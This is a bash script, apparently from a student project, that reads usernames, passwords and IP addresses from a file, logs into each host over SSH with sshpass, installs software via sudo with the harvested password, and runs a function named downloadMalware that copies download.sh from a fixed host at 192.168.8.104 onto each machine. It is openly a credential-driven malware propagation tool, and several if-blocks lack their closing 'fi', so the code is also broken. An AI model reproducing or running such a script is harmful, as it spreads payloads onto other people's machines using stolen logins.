##!/bin/bash -x

login () { #pass, user, ip
	echo "Trying to login $2..."
	sshpass -p "$1" ssh -t -t "$2"@"$3" -p 22  & 
	sleep 1

	sshpass -p "$1" ssh "$2"@"$3" "$(declare -f installsshpass "$1");installsshpass "$1""
	sshpass -p "$1" ssh "$2"@"$3" "$(declare -f createPath "$2");createPath "$2""
	
	sshpass -p "$1" ssh "$2"@"$3" "$(declare -f downloadMalware "$1"  "$2");downloadMalware "$1" "$2""
	
}

installsshpass () {
	echo "Installing sshpass ..."
	echo "$1" | sudo -S apt-get update
	echo "$1" | sudo -S apt-get install sshpass

	if [$? -eq 0];
		then
			echo "sshpass is installed !!!"
		else
			echo "sshpass is not installed. May be already installed."
}

createPath () {
	echo "Creating directory to download..."
	mkdir /home/${1}/Documents/FYP
	if [$? -eq 0];
		then
			echo "Directory created!!!"
		else
			echo "Directory is not created. May be already exist."
}

downloadMalware () {
	echo "Downloading ..."
	echo "$1" | sshpass -p "1234" scp host@192.168.8.104:/home/host/Documents/FYP/download.sh /home/${2}/Documents/FYP 
	if [$? -eq 0];
		then
			echo "Successfully downloaded!!!"
		else
			echo "Download failed."
}


while read -r line;
do
	IFS=" " read -ra ADDR <<<"$line"
	
	for i in "${ADDR[0]}";
	do
	USER="$i" 
	done

	for i in "${ADDR[1]}";
	do 
	PASS="$i"
	done
	
	for i in "${ADDR[2]}";
	do 
	IP="$i"
	done

	login $PASS $USER $IP &

	
done < output.txt
exit
